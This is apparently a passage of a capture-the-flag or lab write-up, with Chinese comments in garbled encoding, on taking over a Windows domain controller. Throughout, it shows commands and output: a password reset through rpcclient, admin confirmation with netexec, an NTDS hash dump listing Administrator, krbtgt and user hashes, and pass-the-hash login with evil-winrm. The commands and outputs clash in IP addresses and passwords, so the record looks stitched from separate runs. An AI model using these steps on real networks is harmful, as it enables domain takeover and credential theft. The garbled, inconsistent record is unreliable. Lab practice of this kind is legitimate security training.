| ```plain â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/DC03/domain] â””â”€$ rpcclient -U "xkate578" 172.16.55.212 Password for [WORKGROUP\xkate578]: rpcclient $> setuserinfo2 fbeth103 23 heathcliff # setuserinfo2æ˜¯rpcclientä¸­çš„ä¸€ä¸ªå‘½ä»¤ï¼Œç”¨äºä¿®æ”¹ç”¨æˆ·è´¦æˆ·çš„ä¿¡æ¯ # 23ï¼šè¡¨ç¤ºè¦ä¿®æ”¹çš„å±æ€§ç±»å‹ï¼ˆRIDï¼Œå³å®‰å…¨æ ‡è¯†ç¬¦çš„åç¼€ï¼‰ã€‚åœ¨ Windows ä¸­ï¼Œ23 å¯¹åº”ç”¨æˆ·å¯†ç å±æ€§ã€‚ rpcclient $> exit  â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/DC03/domain] â””â”€$ netexec smb 172.16.55.212 -u fbeth103 -p heathcliff SMB         192.168.10.101  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)  SMB         192.168.10.101  445    DC01             [+] SOUPEDECODE.LOCAL\fbeth103:hgbe02pass (Pwn3d!) ```  |
| --- |


 æœªæˆåŠŸã€‚ã€‚ã€‚ã€‚é‡æ–°å¯¼å…¥é¶æœºï¼Œä¸ºæ‰€æœ‰ç½‘å¡ä¿®æ”¹macåœ°å€ï¼Œä¿®æ”¹åç§°ï¼Œå¯åŠ¨ï¼Œæ‰§è¡Œå‘½ä»¤ï¼ŒæˆåŠŸï¼  



# è·å–root
## æ–¹æ³•ä¸€
```plain
 root@kali î‚° ~/Desktop/test/DC03/output î‚° evil-winrm -i 192.168.56.126 -u fbeth103 -p hacked!
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
b8e59a7d4020792c412da75e589ff4fc
```

## æ–¹æ³•äºŒ
### è½¬å‚¨ NTDSè·å–NTLMç™»å½•
| ```plain â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/DC03/domain] â””â”€$ netexec smb $IP -u fbeth103 -p hgbe02pass --ntds [!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] Y SMB         192.168.10.101  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)  SMB         192.168.10.101  445    DC01             [+] SOUPEDECODE.LOCAL\fbeth103:hgbe02pass (Pwn3d!) SMB         192.168.10.101  445    DC01             [-] RemoteOperations failed: SMB SessionError: code: 0xc00000ac - STATUS_PIPE_NOT_AVAILABLE - An instance of a named pipe cannot be found in the listening state. SMB         192.168.10.101  445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull... SMB         192.168.10.101  445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:2176416a80e4f62804f101d3a55d6c93::: SMB         192.168.10.101  445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: SMB         192.168.10.101  445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fb9d84e61e78c26063aced3bf9398ef0::: SMB         192.168.10.101  445    DC01             soupedecode.local\bmark0:1103:aad3b435b51404eeaad3b435b51404ee:d72c66e955a6dc0fe5e76d205a630b15::: SMB         192.168.10.101  445    DC01             soupedecode.local\otara1:1104:aad3b435b51404eeaad3b435b51404ee:ee98f16e3d56881411fbd2a67a5494c6::: SMB         192.168.10.101  445    DC01             soupedecode.local\kleo2:1105:aad3b435b51404eeaad3b435b51404ee:bda63615bc51724865a0cd0b4fd9ec14::: SMB         192.168.10.101  445    DC01             soupedecode.local\eyara3:1106:aad3b435b51404eeaad3b435b51404ee:68e34c259878fd6a31c85cbea32ac671::: SMB         192.168.10.101  445    DC01             soupedecode.local\pquinn4:1107:aad3b435b51404eeaad3b435b51404ee:92cdedd79a2fe7cbc8c55826b0ff2d54::: SMB         192.168.10.101  445    DC01             soupedecode.local\jharper5:1108:aad3b435b51404eeaad3b435b51404ee:800f9c9d3e4654d9bd590fc4296adf01::: SMB         192.168.10.101  445    DC01             soupedecode.local\bxenia6:1109:aad3b435b51404eeaad3b435b51404ee:d997d3309bc876f12cbbe932d82b18a3::: -------------- ```  |
| --- |


```plain
â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/DC03/domain]
â””â”€$ evil-winrm -i $IP -u Administrator -H 2176416a80e4f62804f101d3a55d6c93
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
soupedecode\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
b8e59a7d4020792c412da75e589ff4fc
```



